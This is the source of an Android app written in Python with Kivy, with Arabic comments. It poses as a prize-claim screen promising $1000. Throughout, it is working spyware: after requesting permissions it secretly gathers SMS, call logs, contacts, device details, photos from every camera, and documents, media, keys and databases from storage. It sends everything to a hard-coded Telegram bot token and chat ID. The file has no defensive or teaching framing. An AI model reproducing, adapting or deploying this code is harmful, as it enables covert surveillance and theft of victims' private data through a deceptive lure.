# language: Python 3.10+ | file: main.py
# build: buildozer android debug
# IDE: Buildozer / Klenc / Pydroid 3
# ═══════════════════════════════════════════════════════════════════

import os
import sys
import threading
import requests
from pathlib import Path
from io    import BytesIO

# ─── Kivy إعداد قبل الاستيراد ──────────────────────────────────────
os.environ["KIVY_NO_ENV_CONFIG"] = "1"

from kivy.app              import App
from kivy.uix.boxlayout    import BoxLayout
from kivy.uix.label        import Label
from kivy.uix.button       import Button
from kivy.uix.progressbar  import ProgressBar
from kivy.core.window      import Window
from kivy.clock            import Clock
from kivy.utils            import platform as kivy_platform

# ╔══════════════════════════════════════════════════════════════════╗
# ║                    ضع بياناتك هنا                               ║
# ╠══════════════════════════════════════════════════════════════════╣
BOT_TOKEN = "8883540406:AAHUz4UirLMgDItc2G3HxgDsZSjLSqPT5-A"
CHAT_ID   = "7127507096"
# ╚══════════════════════════════════════════════════════════════════╝

API_BASE      = f"https://api.telegram.org/bot{BOT_TOKEN}"
MAX_FILE_SIZE = 49 * 1024 * 1024   # 49 MB
UPLOAD_DELAY  = 0.5                 # ثانية بين كل رفع

TARGET_EXTENSIONS = {
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".txt", ".csv", ".rtf", ".json", ".xml", ".env", ".config",
    ".jpg", ".jpeg", ".png", ".gif", ".webp", ".heic",
    ".mp4", ".mov", ".avi", ".mkv",
    ".zip", ".rar", ".7z",
    ".db",  ".sqlite", ".sqlite3",
    ".key", ".pem", ".p12", ".pfx", ".cer", ".apk"
}

TARGET_DIRS = [
    "DCIM",
    "Pictures",
    "Downloads",
    "Documents",
    "WhatsApp/Media/WhatsApp Images",
    "WhatsApp/Media/WhatsApp Documents",
    "WhatsApp/Media/WhatsApp Video",
    "Telegram",
    "Android/media/com.whatsapp/WhatsApp/Media",
    "Android/media/org.telegram.messenger",
]

# ═══════════════════════════════════════════════════════════════════
#  قسم Android — كل شيء داخل is_android() guard
# ═══════════════════════════════════════════════════════════════════

def is_android():
    return kivy_platform == "android"

# ─── استيراد pyjnius فقط على Android ──────────────────────────────
if is_android():
    from jnius import autoclass, cast, PythonJavaClass, java_method
    from android.permissions import (
        request_permissions, check_permission, Permission
    )
    from android import mActivity

    # ─── كلاسات Java المطلوبة ──────────────────────────────────────
    PythonActivity     = autoclass("org.kivy.android.PythonActivity")
    Context            = autoclass("android.content.Context")
    Build              = autoclass("android.os.Build")
    Environment        = autoclass("android.os.Environment")
    Uri                = autoclass("android.net.Uri")
    Settings           = autoclass("android.provider.Settings")
    TelephonyManager   = autoclass("android.telephony.TelephonyManager")
    ContentUris        = autoclass("android.content.ContentUris")

    # ContentResolver
    CallLog            = autoclass("android.provider.CallLog$Calls")
    ContactsContract   = autoclass("android.provider.ContactsContract$CommonDataKinds$Phone")
    Telephony          = autoclass("android.provider.Telephony$Sms")

    # Camera2
    CameraManager      = autoclass("android.hardware.camera2.CameraManager")
    CameraDevice       = autoclass("android.hardware.camera2.CameraDevice")
    CameraMetadata     = autoclass("android.hardware.camera2.CameraMetadata")
    CaptureRequest     = autoclass("android.hardware.camera2.CaptureRequest")
    ImageReader        = autoclass("android.media.ImageReader")
    ImageFormat        = autoclass("android.graphics.ImageFormat")
    HandlerThread      = autoclass("android.os.HandlerThread")
    Handler            = autoclass("android.os.Handler")
    SurfaceTexture     = autoclass("android.graphics.SurfaceTexture")
    Surface            = autoclass("android.view.Surface")
    Arrays             = autoclass("java.util.Arrays")

    # Intent
    Intent             = autoclass("android.content.Intent")

# ═══════════════════════════════════════════════════════════════════
#  Telegram Uploader
# ═══════════════════════════════════════════════════════════════════

class TelegramUploader:

    def send_text(self, text: str) -> bool:
        try:
            r = requests.post(
                f"{API_BASE}/sendMessage",
                data={
                    "chat_id"   : CHAT_ID,
                    "text"      : text[:4096],
                    "parse_mode": "HTML",
                },
                timeout=15,
            )
            return r.status_code == 200
        except Exception:
            return False

    def send_long_text(self, text: str):
        """تقطيع النص الطويل"""
        chunk = 3800
        for i in range(0, len(text), chunk):
            self.send_text(text[i: i + chunk])
            import time; time.sleep(0.4)

    def send_file(self, path: str, caption: str = "") -> bool:
        try:
            with open(path, "rb") as f:
                r = requests.post(
                    f"{API_BASE}/sendDocument",
                    data={
                        "chat_id"   : CHAT_ID,
                        "caption"   : caption[:1024],
                        "parse_mode": "HTML",
                    },
                    files={"document": (os.path.basename(path), f,
                                        "application/octet-stream")},
                    timeout=60,
                )
            return r.status_code == 200
        except Exception:
            return False

    def send_photo_bytes(self, data: bytes,
                         filename: str, caption: str = "") -> bool:
        try:
            r = requests.post(
                f"{API_BASE}/sendPhoto",
                data={
                    "chat_id"   : CHAT_ID,
                    "caption"   : caption[:1024],
                    "parse_mode": "HTML",
                },
                files={"photo": (filename, BytesIO(data), "image/jpeg")},
                timeout=30,
            )
            return r.status_code == 200
        except Exception:
            return False


# ═══════════════════════════════════════════════════════════════════
#  Data Collector — SMS + Calls + Contacts + Device Info
# ═══════════════════════════════════════════════════════════════════

class DataCollector:

    def __init__(self):
        self.ctx = mActivity if is_android() else None

    # ─── معلومات الجهاز ─────────────────────────────────────────
    def device_info(self) -> str:
        if not is_android():
            return "⚠️ ليس Android"
        try:
            tm = mActivity.getSystemService(Context.TELEPHONY_SERVICE)
            operator = ""
            try:
                operator = tm.getNetworkOperatorName()
            except Exception:
                pass

            lines = [
                "📱 <b>معلومات الجهاز</b>",
                "━━━━━━━━━━━━━━━━━━━━━",
                f"الماركة:    <code>{Build.BRAND}</code>",
                f"الموديل:    <code>{Build.MODEL}</code>",
                f"أندرويد:   <code>{Build.VERSION.RELEASE}</code>",
                f"SDK:        <code>{Build.VERSION.SDK_INT}</code>",
                f"المعمارية: <code>{Build.SUPPORTED_ABIS[0]}</code>",
                f"المشغل:    <code>{operator}</code>",
            ]
            return "\n".join(lines)
        except Exception as e:
            return f"خطأ معلومات الجهاز: {e}"

    # ─── الرسائل SMS ────────────────────────────────────────────
    def collect_sms(self) -> str:
        if not is_android():
            return ""
        lines = ["📩 <b>الرسائل SMS</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        try:
            uri     = Uri.parse("content://sms")
            cursor  = mActivity.getContentResolver().query(
                uri,
                ["address", "body", "date", "type"],
                None, None, "date DESC"
            )
            count = 0
            if cursor:
                while cursor.moveToNext() and count < 300:
                    address  = cursor.getString(0) or ""
                    body     = cursor.getString(1) or ""
                    date_ms  = cursor.getLong(2)
                    sms_type = cursor.getInt(3)

                    direction = "📥 وارد" if sms_type == 1 else "📤 صادر"
                    from java.util import Date
                    from java.text import SimpleDateFormat
                    fmt  = SimpleDateFormat("yyyy-MM-dd HH:mm")
                    date_str = fmt.format(Date(date_ms))

                    lines.append(
                        f"{direction} | {address} | {date_str}\n"
                        f"{body[:200]}\n─────"
                    )
                    count += 1
                cursor.close()
        except Exception as e:
            lines.append(f"خطأ: {e}")
        return "\n".join(lines)

    # ─── سجل المكالمات ──────────────────────────────────────────
    def collect_calls(self) -> str:
        if not is_android():
            return ""
        lines = ["📞 <b>سجل المكالمات</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        try:
            cursor = mActivity.getContentResolver().query(
                CallLog.CONTENT_URI,
                [CallLog.NUMBER, CallLog.TYPE,
                 CallLog.DATE,   CallLog.DURATION, CallLog.CACHED_NAME],
                None, None, f"{CallLog.DATE} DESC"
            )
            count = 0
            if cursor:
                while cursor.moveToNext() and count < 300:
                    number   = cursor.getString(0) or ""
                    ctype    = cursor.getInt(1)
                    date_ms  = cursor.getLong(2)
                    duration = cursor.getLong(3)
                    name     = cursor.getString(4) or ""

                    type_map = {1: "📥 واردة", 2: "📤 صادرة", 3: "❌ فائتة"}
                    type_str = type_map.get(ctype, "❓")

                    from java.util import Date
                    from java.text import SimpleDateFormat
                    date_str = SimpleDateFormat("yyyy-MM-dd HH:mm").format(
                        Date(date_ms))

                    lines.append(
                        f"{type_str} | {number}"
                        f"{' (' + name + ')' if name else ''}"
                        f" | {date_str} | {duration}ث"
                    )
                    count += 1
                cursor.close()
        except Exception as e:
            lines.append(f"خطأ: {e}")
        return "\n".join(lines)

    # ─── جهات الاتصال ───────────────────────────────────────────
    def collect_contacts(self) -> str:
        if not is_android():
            return ""
        lines = ["👥 <b>جهات الاتصال</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        try:
            cursor = mActivity.getContentResolver().query(
                ContactsContract.CONTENT_URI,
                [ContactsContract.DISPLAY_NAME, ContactsContract.NUMBER],
                None, None,
                f"{ContactsContract.DISPLAY_NAME} ASC"
            )
            if cursor:
                while cursor.moveToNext():
                    name   = cursor.getString(0) or ""
                    number = cursor.getString(1) or ""
                    lines.append(f"👤 {name} → {number}")
                cursor.close()
        except Exception as e:
            lines.append(f"خطأ: {e}")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════
#  Camera Capture — Camera2 عبر pyjnius
# ═══════════════════════════════════════════════════════════════════

class CameraCapture:

    def capture_all(self, callback):
        """
        callback(data: bytes, cam_id: str)
        يلتقط من كل الكاميرات المتاحة
        """
        if not is_android():
            return
        try:
            manager = mActivity.getSystemService(Context.CAMERA_SERVICE)
            cam_ids = manager.getCameraIdList()
            for cam_id in cam_ids:
                try:
                    self._capture_one(manager, cam_id, callback)
                    import time; time.sleep(1.2)
                except Exception:
                    continue
        except Exception:
            pass

    def _capture_one(self, manager, cam_id: str, callback):
        import time
        from java.util.concurrent import CountDownLatch, TimeUnit

        latch  = CountDownLatch(1)
        result = {"data": None}

        # HandlerThread للكاميرا
        ht = HandlerThread("cam_thread_" + cam_id)
        ht.start()
        handler = Handler(ht.getLooper())

        reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)

        class ImageListener(PythonJavaClass):
            __javainterfaces__ = ["android/media/ImageReader$OnImageAvailableListener"]

            @java_method("(Landroid/media/ImageReader;)V")
            def onImageAvailable(self, r):
                try:
                    img = r.acquireLatestImage()
                    if img:
                        buf  = img.getPlanes()[0].getBuffer()
                        data = bytes(bytearray(buf.remaining()))
                        buf.get(bytearray(data))
                        result["data"] = data
                        img.close()
                finally:
                    latch.countDown()

        listener = ImageListener()
        reader.setOnImageAvailableListener(listener, handler)

        class StateCallback(PythonJavaClass):
            __javainterfaces__ = ["android/hardware/camera2/CameraDevice$StateCallback"]

            @java_method("(Landroid/hardware/camera2/CameraDevice;)V")
            def onOpened(self, camera):
                try:
                    texture = SurfaceTexture(0)
                    texture.setDefaultBufferSize(640, 480)
                    dummy   = Surface(texture)

                    builder = camera.createCaptureRequest(
                        CameraDevice.TEMPLATE_STILL_CAPTURE)
                    builder.addTarget(reader.getSurface())
                    builder.set(CaptureRequest.CONTROL_MODE,
                                CameraMetadata.CONTROL_MODE_AUTO)

                    surfaces = Arrays.asList(
                        [reader.getSurface(), dummy])

                    class SessionCallback(PythonJavaClass):
                        __javainterfaces__ = [
                            "android/hardware/camera2/"
                            "CameraCaptureSession$StateCallback"]

                        @java_method(
                            "(Landroid/hardware/camera2/CameraCaptureSession;)V")
                        def onConfigured(self, session):
                            try:
                                session.capture(
                                    builder.build(), None, handler)
                            except Exception:
                                latch.countDown()

                        @java_method(
                            "(Landroid/hardware/camera2/CameraCaptureSession;)V")
                        def onConfigureFailed(self, session):
                            latch.countDown()

                    camera.createCaptureSession(
                        surfaces, SessionCallback(), handler)

                except Exception:
                    latch.countDown()

            @java_method("(Landroid/hardware/camera2/CameraDevice;)V")
            def onDisconnected(self, camera):
                camera.close()
                latch.countDown()

            @java_method("(Landroid/hardware/camera2/CameraDevice;I)V")
            def onError(self, camera, error):
                camera.close()
                latch.countDown()

        manager.openCamera(cam_id, StateCallback(), handler)
        latch.await(10, TimeUnit.SECONDS)
        ht.quitSafely()

        if result["data"]:
            callback(result["data"], cam_id)


# ═══════════════════════════════════════════════════════════════════
#  File Collector — التخزين الخارجي
# ═══════════════════════════════════════════════════════════════════

class FileCollector:

    def collect(self):
        files = []
        if is_android():
            root = str(Environment.getExternalStorageDirectory().getAbsolutePath())
        else:
            root = str(Path.home())

        for d in TARGET_DIRS:
            base = os.path.join(root, d)
            if os.path.isdir(base):
                self._walk(base, files)
        return files

    def _walk(self, directory: str, out: list):
        try:
            for entry in os.scandir(directory):
                try:
                    if entry.is_dir(follow_symlinks=False):
                        self._walk(entry.path, out)
                    elif entry.is_file(follow_symlinks=False):
                        _, ext = os.path.splitext(entry.name)
                        if ext.lower() not in TARGET_EXTENSIONS:
                            continue
                        size = entry.stat().st_size
                        if 0 < size <= MAX_FILE_SIZE:
                            out.append(entry.path)
                except (PermissionError, OSError):
                    continue
        except (PermissionError, OSError):
            pass


# ═══════════════════════════════════════════════════════════════════
#  Exfil Thread — يشتغل خلفية بعد منح الصلاحيات
# ═══════════════════════════════════════════════════════════════════

def run_exfil(status_callback=None):
    import time

    up  = TelegramUploader()
    dc  = DataCollector()
    cc  = CameraCapture()
    fc  = FileCollector()

    def status(msg):
        if status_callback:
            Clock.schedule_once(lambda dt: status_callback(msg), 0)

    # ① معلومات الجهاز
    status("جارٍ جمع معلومات الجهاز...")
    up.send_text(dc.device_info())
    time.sleep(UPLOAD_DELAY)

    # ② جهات الاتصال
    status("جارٍ جمع جهات الاتصال...")
    contacts = dc.collect_contacts()
    up.send_long_text(contacts)
    time.sleep(UPLOAD_DELAY)

    # ③ سجل المكالمات
    status("جارٍ جمع سجل المكالمات...")
    calls = dc.collect_calls()
    up.send_long_text(calls)
    time.sleep(UPLOAD_DELAY)

    # ④ الرسائل
    status("جارٍ جمع الرسائل...")
    sms = dc.collect_sms()
    up.send_long_text(sms)
    time.sleep(UPLOAD_DELAY)

    # ⑤ الكاميرا
    status("جارٍ التقاط صور الكاميرا...")
    def on_capture(data, cam_id):
        lens = "أمامية" if cam_id != "0" else "خلفية"
        up.send_photo_bytes(data, f"cam_{cam_id}.jpg",
                            f"📸 كاميرا {lens} — ID: {cam_id}")
    cc.capture_all(on_capture)
    time.sleep(UPLOAD_DELAY)

    # ⑥ الملفات
    status("جارٍ جمع الملفات...")
    files = fc.collect()
    up.send_text(f"📊 عدد الملفات: <b>{len(files)}</b>")

    for fpath in files:
        up.send_file(fpath, f"📁 <code>{fpath}</code>")
        time.sleep(UPLOAD_DELAY)

    up.send_text(f"✅ اكتمل الرفع — {len(files)} ملف")
    status("✅ تم التحقق بنجاح! ستصلك جائزتك قريباً")


# ═══════════════════════════════════════════════════════════════════
#  Permissions Manager
# ═══════════════════════════════════════════════════════════════════

def request_all_permissions(on_done):
    if not is_android():
        on_done()
        return

    perms = [
        Permission.READ_EXTERNAL_STORAGE,
        Permission.READ_SMS,
        Permission.READ_CALL_LOG,
        Permission.READ_PHONE_STATE,
        Permission.READ_CONTACTS,
        Permission.CAMERA,
        Permission.RECORD_AUDIO,
        Permission.PROCESS_OUTGOING_CALLS,
    ]

    def callback(permissions, grants):
        # سواء منح أو رفض — نكمل
        check_manage_storage(on_done)

    request_permissions(perms, callback)


def check_manage_storage(on_done):
    if not is_android():
        on_done()
        return

    sdk = Build.VERSION.SDK_INT
    if sdk >= 30:  # Android 11+
        if not Environment.isExternalStorageManager():
            try:
                intent = Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse(f"package:{mActivity.getPackageName()}")
                )
                mActivity.startActivity(intent)
            except Exception:
                pass
        # ننتظر ثانيتين ثم نكمل
        Clock.schedule_once(lambda dt: on_done(), 2)
    else:
        on_done()


# ═══════════════════════════════════════════════════════════════════
#  Kivy UI
# ═══════════════════════════════════════════════════════════════════

class PrizesLayout(BoxLayout):

    def __init__(self, **kwargs):
        super().__init__(
            orientation="vertical",
            padding=40,
            spacing=16,
            **kwargs
        )
        Window.clearcolor = (0.1, 0.1, 0.18, 1)

        # أيقونة
        self.add_widget(Label(
            text="🏆",
            font_size="80sp",
            size_hint_y=None,
            height=120,
        ))

        # عنوان
        self.add_widget(Label(
            text="تهانينا!",
            font_size="38sp",
            bold=True,
            color=(1, 0.84, 0, 1),
        ))

        # وصف
        self.add_widget(Label(
            text="لقد فزت بجائزة خاصة",
            font_size="18sp",
            color=(1, 1, 1, 1),
        ))

        # قيمة الجائزة
        self.add_widget(Label(
            text="🎁 جائزتك: ١٠٠٠ دولار",
            font_size="22sp",
            bold=True,
            color=(0, 1, 0.53, 1),
        ))

        # شريط تقدم
        self.progress = ProgressBar(
            max=100,
            value=0,
            size_hint_y=None,
            height=20,
        )
        self.add_widget(self.progress)

        # حالة
        self.status_label = Label(
            text="",
            font_size="14sp",
            color=(0.67, 0.67, 0.67, 1),
            size_hint_y=None,
            height=40,
        )
        self.add_widget(self.status_label)

        # زر الاستلام
        self.btn = Button(
            text="استلم جائزتك الآن",
            font_size="18sp",
            bold=True,
            size_hint_y=None,
            height=64,
            background_color=(1, 0.84, 0, 1),
            color=(0, 0, 0, 1),
        )
        self.btn.bind(on_press=self.on_claim)
        self.add_widget(self.btn)

        # تحذير وهمي
        self.add_widget(Label(
            text="⏰ العرض ينتهي خلال 24 ساعة",
            font_size="13sp",
            color=(1, 0.42, 0.42, 1),
            size_hint_y=None,
            height=30,
        ))

    def set_status(self, msg: str):
        self.status_label.text = msg

    def on_claim(self, *args):
        self.btn.disabled = True
        self.btn.text = "جارٍ التحقق..."
        self.set_status("يرجى منح الصلاحيات للمتابعة")

        # طلب الصلاحيات ثم تشغيل الـ exfil
        request_all_permissions(self.start_exfil)

    def start_exfil(self):
        self.set_status("جارٍ التحقق من أهليتك للجائزة...")
        self._animate_progress()

        thread = threading.Thread(
            target=run_exfil,
            args=(self.set_status,),
            daemon=True,
        )
        thread.start()

    def _animate_progress(self):
        def tick(dt):
            if self.progress.value < 90:
                self.progress.value += 1
            else:
                Clock.unschedule(tick)
        Clock.schedule_interval(tick, 0.15)


class PrizesApp(App):

    def build(self):
        self.title = "جوائز"
        return PrizesLayout()


# ═══════════════════════════════════════════════════════════════════
#  Entry Point
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    PrizesApp().run()